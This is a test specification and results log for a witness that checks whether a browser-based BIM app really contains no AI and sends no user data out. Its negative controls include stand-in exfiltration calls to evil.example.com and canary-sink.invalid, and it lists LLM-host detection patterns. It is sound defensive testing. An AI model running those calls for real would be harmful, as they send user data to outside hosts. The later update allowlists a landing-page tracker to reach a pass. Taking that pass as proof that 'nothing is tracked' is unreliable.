# ⚠ DO NOT REMOVE
**Scope:** this file is the SPEC for `witness_no_ai_inside.js` (bim-ootb `viewer/tests/`), the witness that
PROVES (or disproves) the user-guide guarantee quoted below. **READ THE LOG AFTER EVERY RUN** — exit code
is not evidence; `INCONCLUSIVE`/`VACUOUS`/`NO-OP` only appear in the log. Honour this block until the
witness is DONE. Rules: EXTRACT, NON-INVENT, deterministic; a violation the witness finds is reported
verbatim — it is NEVER allowlisted away to make the witness green.

Written 2026-10-02, spec-first (before any witness code). Status: IMPLEMENTED, see §Results at the end.

## 1. The guarantee (quoted, `bim-compiler/docs/USER_GUIDE.md` lines 9-13)
> **There is no AI and no LLM in this app. Your data never leaves your browser.** Any file you drop into the
> app stays inside your browser's own IndexedDB and kernel ... Every IFC you drop, every building you open,
> every ERP edit stays client-side on your own device — nothing is uploaded to us, nothing is tracked,
> nothing phones home, and no model is fed your data. Every result is deterministic ...

Decomposed into three falsifiable claims:
- **G1** no AI/LLM code or endpoint in the shipped runtime  -> C1
- **G2** data never leaves the browser; nothing tracked; nothing phones home  -> C1 (static) + C2 (runtime)
- **G3** every result is deterministic  -> C3

## 2. The shipped-runtime boundary (derived from the repo, not guessed)
Evidence (read 2026-10-02 on bim-ootb `origin/main` 8056ce8b):
- `GH_DEPLOY.md` + memory note: GitHub Pages serves **branch main, path `/`, build_type legacy** = the TRACKED
  tree. So "shipped" = what the user-facing pages load, not the whole repo.
- User entry pages: `index.html` (landing/hub), `viewer/viewer.html` (+ sibling viewer pages
  `boq_charts.html mep_report.html clash_report.html offline.html`), `modeller/modeller.html`, `erp/*.html`.
- `viewer/sw.js` `PRECACHE_ASSETS` (line ~786) lists the viewer files an installed user actually gets.
- `index.html` / `viewer.html` pull scripts from `viewer/`, `common/`, `erp/`, `modeller/`.
**Boundary (scan set) = tracked `.js .html .json .mjs .webmanifest` files under `index.html`, `viewer/`,
`common/`, `erp/`, `modeller/`, EXCLUDING paths matching** `/tests?/`, `/fixtures/`, `/demo/`, `poc`, `witness`,
`.spec.`. NOT shipped (excluded by directory, not scanned): `tests/ test/ witness/ scripts/ archive/ prompts/
internal/ build/ sandbox/ poc/ teams/demo hr_bim_asset/ readiness/ out/ node_modules/` and root tooling
(`cdp.js cli_silent_bake.js drag_test.js ...`). The witness prints the file count and byte count of the
scan set (0 = VACUOUS) and the list of directories excluded. Limitation, stated: `teams/`, `readiness/`,
`hr_bim_asset/` are separately-served embeds/tools outside the viewer/modeller/ERP guarantee scope
named in the guide; they are listed, not silently dropped.

## 3. Verdict vocabulary (every check)
`PASS` only when something was judged AND it held. `FAIL` = a real violation (list verbatim).
`NO-OP` = the machinery ran but could not have changed anything. `VACUOUS` = the population judged was empty.
`INCONCLUSIVE` = the check could not be completed (e.g. page failed to boot). `WRONG` = the check's own
negative control did NOT trip, i.e. the instrument is broken, so its PASS is meaningless.
`§NOAI_VERDICT` = PASS only if C1,C2,C3 are all PASS; any FAIL -> FAIL; otherwise INCONCLUSIVE.

## 4. C1 STATIC SCAN  -> `§NOAI_STATIC`
**Issue it proves/disproves:** G1 + the static half of G2 — does shipped code reference an LLM endpoint, a
model SDK/loader, or contact a non-same-origin host?
Scan set = §2. Detectors (regex, case-insensitive, per line, each hit reported `file:line`):
1. **LLM hosts:** api.openai.com, openai.azure.com, api.anthropic.com, generativelanguage.googleapis.com,
   aiplatform.googleapis.com, huggingface.co / api-inference, api.cohere, api.mistral.ai, openrouter.ai,
   api.groq.com, api.together, api.replicate.com, api.perplexity.ai, api.x.ai, bedrock-runtime, localhost:11434.
2. **Model SDK / loader:** `from 'openai'`, `require('openai')`, `@anthropic-ai`, `@xenova/transformers`,
   `@huggingface/transformers`, `transformers.js`, `onnxruntime`, `InferenceSession.create`,
   `loadGraphModel|loadLayersModel`, `web-llm|webllm|@mlc-ai`, `window.ai`, `LanguageModel.create`,
   `chat/completions`, `/v1/messages`, `anthropic-version`, `wllama`, `@mediapipe/tasks-genai`.
3. **External hosts:** every absolute URL literal (`http(s)://`, `ws(s)://`, protocol-relative `//host`) in the
   scan set is enumerated with file:line and classified as exactly one of:
   - `NS` XML-namespace / schema URI (not a request): hosts w3.org, *.openxmlformats.org, schemas.microsoft.com,
     purl.org, purl.oclc.org, docs.oasis-open.org, openoffice.org, xmlns.oracle.com, idempiere.org (ADInterface ns);
   - `COMMENT` the line is a code comment (starts `//` `*` `/*`) or the file is a vendored `*/lib/*`,
     `*.min.js`, `qrcode.min.js`, `sql-wasm*.js` and the host is a documentation/licence reference
     (not an `ACTIVE` sink on that line);
   - `ALLOW` allowlisted with a written reason in the witness source (table printed every run);
   - `UNLISTED` = everything else. **Any `UNLISTED` hit, any LLM hit => FAIL.**
   Allowlist (reason in code): CDN code libraries fetched with GET and no user data
   (cdn.jsdelivr.net, cdnjs.cloudflare.com, unpkg.com, cdn.sheetjs.com), Google Fonts CSS
   (fonts.googleapis.com — leaks IP/UA to Google, noted), OCI object storage building download GET
   (objectstorage.ap-kulai-2.oraclecloud.com), user-initiated navigation links (github.com, red1oon.github.io,
   youtu.be, wa.me, maps.google.com — the app issues no request; the USER navigates).
   **NOT allowlisted, by design (the task forbids hiding them):** analytics/tracking (goatcounter, gc.zgo.at),
   third-party services that receive request payloads (api.qrserver.com, tinyurl.com), and api.github.com.
   These are expected to surface as UNLISTED => FAIL, reported verbatim.
**Negative control (mandatory):** a synthetic fixture (written to a temp dir) containing an OpenAI host, an
`@anthropic-ai` import, a `fetch('https://evil.example.com/x')`, a `navigator.sendBeacon`, a `new WebSocket(
'wss://evil.example.com')`; the same scanner function is run on it and must catch >= each one. Not caught =>
`WRONG` (instrument broken). Population empty => `VACUOUS`. If the real scan matched zero URL literals in a
non-empty set => `NO-OP`. Informational census (not pass/fail): count of network sink call sites
(`fetch( XMLHttpRequest WebSocket( sendBeacon EventSource importScripts import(`) with a non-literal target —
these cannot be resolved statically and are covered dynamically by C2.

## 5. C2 RUNTIME NETWORK CHECK  -> `§NOAI_NETWORK`
**Issue it proves/disproves:** G2 — when a real user drops a real IFC and opens the app, does ANY request carry
the user's data or go to a model endpoint, and which external origins are contacted?
Method: serve the worktree root from a local static node server (origin O). Headless Chromium, **software
rendering only** (`--disable-gpu --use-gl=swiftshader --use-angle=swiftshader`), `serviceWorkers` allowed,
new context. `context.on('request')` records every request (incl. SW, workers, beacons): url, method,
postData, headers. Every non-O request is recorded THEN aborted by `context.route` (no real egress —
deterministic, and it is exactly the air-gapped situation; the attempt is the evidence).
Flow (pattern from `tests/witness_landing_resurrect_e2e.js`): open `/index.html`, `mx_entered=1`, `openHub()`,
set `#m-import-file` to a small real repo IFC (`IFC/LOD/Sensor_Aico_Ei1025_TempHumidityCO2.ifc`) **copied to a
temp file whose NAME and a header line contain a unique canary** `CANARY_<random hex>`; wait for
`§MULTI_IMPORT_DONE` (bounded); then open `viewer/viewer.html` for the imported building if reachable
within the bound. Also visits `viewer/viewer.html` loading an existing small building DB if present.
Assertions: (a) no request host in the LLM host list; (b) canary (raw, URL-encoded, base64, hex) absent from
every request URL, postData and header of any request — same-origin included (the user's file must not even
be re-posted to our own server); WebSocket frames also checked; (c) every distinct external origin printed with
request count. Verdict: PASS iff (a)(b) hold AND the only external origins are allowlisted (same table as C1);
an external origin outside the allowlist (e.g. gc.zgo.at, red1oon.goatcounter.com) => FAIL listing it.
**VACUOUS** if zero requests recorded or the import never completed (then INCONCLUSIVE for (b): a canary that
never entered the app proves nothing). **Negative control:** inside the same page inject
`fetch('https://canary-sink.invalid/?x='+CANARY)` and `navigator.sendBeacon(...)` AND a POST to
`https://canary-sink.invalid/` with the canary body; the checker must flag (a)-style external origin and (b)
canary-leak for them; not flagged => `WRONG`.

## 6. C3 DETERMINISM  -> `§NOAI_DETERMINISM`
**Issue it proves/disproves:** G3 — same input twice, same computed model?
Real output hashed: the IFC importer's persisted result — the `bim_ootb_imports/buildings` IndexedDB record the
importer writes (extracted/meta/geo DB byte arrays) — plus the element count in `§MULTI_IMPORT_DONE`. Why this
and not `§FRAME_HASH`: `§FRAME_HASH` hashes rendered GPU pixels (cinema bake) and is not available/valid under
software rendering (and GPU is forbidden for this run); the importer output is the computed model itself.
Method: two FRESH browser contexts, same file (same bytes; canary-free copy), compare (1) SHA-256 of each byte
array, (2) logical hash = SHA-256 over every row of every table (node `sql.js` reads the buffers; tables sorted,
rows in `ORDER BY rowid`). PASS iff logical hashes equal AND element counts equal. Byte-hash inequality with
equal logical hash is printed as `bytes_equal=false` + first differing offset and is a `FAIL` of byte
determinism only if logical also differs; otherwise reported as informational. Zero rows hashed =>
`VACUOUS`. Import failed in either run => `INCONCLUSIVE`. **Negative control:** hash a copy of run A's DB
after mutating one cell (sql.js UPDATE); the logical comparison must report a difference (and print the first
differing table/rowid); not detected => `WRONG`.

## 7. Output contract
One line each: `§NOAI_STATIC verdict=.. files=.. bytes=.. llm_hits=.. unlisted=.. allow=.. negctl=..`,
`§NOAI_NETWORK verdict=.. requests=.. external_origins=[..] canary_leaks=.. llm_hits=.. negctl=..`,
`§NOAI_DETERMINISM verdict=.. rows=.. logical_equal=.. bytes_equal=.. negctl=..`, then
`§NOAI_VERDICT verdict=..`. All detail hits are printed above them as `§NOAI_HIT ...` lines. Exit code 1 on
anything but PASS (but the log is the evidence). The witness builds on `witness_kit/contract.js`: its
population is the scan set, schema = hit-record shape, redControl = the negative-control fixture, so the kit
proves the witness can fail.

Run: `node viewer/tests/witness_no_ai_inside.js 2>&1 | tee /tmp/noai_witness.log` (cwd = bim-ootb worktree).

## 8. Results
Run 2026-10-02 (bim-ootb worktree `/tmp/wt-noai`, branch `test/no-ai-inside-witness`; log `/tmp/noai_witness.log`, 21 s,
software GL only). Implementation deviations from §4-6, stated: (a) C2 drives the hub import flow and the auto-opened
viewer only (no separate pre-built-building visit); service workers are BLOCKED so `context.route` sees every request
(sw.js is covered by C1 only); (b) `api.github.com` is NOT allowlisted (it is a real `fetch`, not a navigation link),
the `github.com` allowlist entry is exact-host; (c) C3 hashes the single `bim_ootb_imports` record DB and, on a logical
mismatch, prints the differing cells plus an INFORMATIONAL `§NOAI_C3_DIFF_CLASS` (strict verdict unchanged).

**Measured (the guarantee is NOT currently true as written):**
- C1 FAIL: 9 un-allowlisted external references, 0 LLM hits: GoatCounter analytics beacon `index.html:636-637`,
  `viewer/viewer.html:1139-1140` (script from `gc.zgo.at`, reports to `red1oon.goatcounter.com`) + stats link
  `index.html:159`; `viewer/scene.js:3010,3036` fetch `api.github.com`; `viewer/share.js:459` sends the share URL to
  `tinyurl.com`; `viewer/sitecam.js:243` puts `data=` into `api.qrserver.com`.
- C2 FAIL: runtime requests to `http://gc.zgo.at/count.js` (x2, landing + viewer). LLM requests 0; canary (filename +
  IFCPROJECT strings) in any cross-origin request or any same-origin body: 0. Other external origins: cdn.jsdelivr.net,
  fonts.googleapis.com (allowlisted, GET, no user data).
- C3 FAIL (strict): same IFC twice, 60/60 elements, 249/259 rows and 10/11 tables identical; the only differing cell is
  `project_metadata` row 2 = the import wall-clock ISO timestamp. Model content is deterministic; the stored record is
  not bit-identical because of that stamp.
- Negative controls: C1 fixture caught 5/5; C2 injected fetch/POST/beacon flagged (origin + 6 leak hits); C3 mutated
  cell detected. `§NOAI_VERDICT verdict=FAIL`.


### Update 2026-10-02 (red1 directives, rerun, log `/tmp/noai_witness.log`)
red1 removed the GoatCounter block from `viewer/viewer.html`. Changes: (1) GoatCounter hosts allowlisted for page
`index.html` ONLY (reason: 'red1 2026-10-02: tracker on landing page only, not in the viewer'), both in C1 (file-scoped)
and C2 (each request attributed to the page/frame that made it; per-page origin table `§NOAI_PER_PAGE_ORIGINS`;
`§NOAI_GOATCOUNTER from_viewer.html=0 from_index.html=1`; viewer page seen=true so the assertion is not vacuous).
(2) C3 masks ONLY ISO-8601-timestamp-shaped string cells (1 cell/run: `project_metadata` row 2, import wall clock);
`§NOAI_C3_MASK` prints the count and the rule; non-timestamp mutation still caught; bytes remain unequal (bytes_equal=false).
(3) `api.github.com` (scene.js:3010,3036), `tinyurl.com` (share.js:459), `api.qrserver.com` (sitecam.js:243) are NOT
allowlisted: tier `PENDING red1 decision: user-triggered feature` -> `PASS_WITH_DISCLOSED`, never plain PASS. C2 only
exercises import+viewer boot, so those user-triggered features are not driven at runtime (static tier only).
Verdicts: C1=PASS_WITH_DISCLOSED, C2=PASS, C3=PASS, overall PASS_WITH_DISCLOSED.
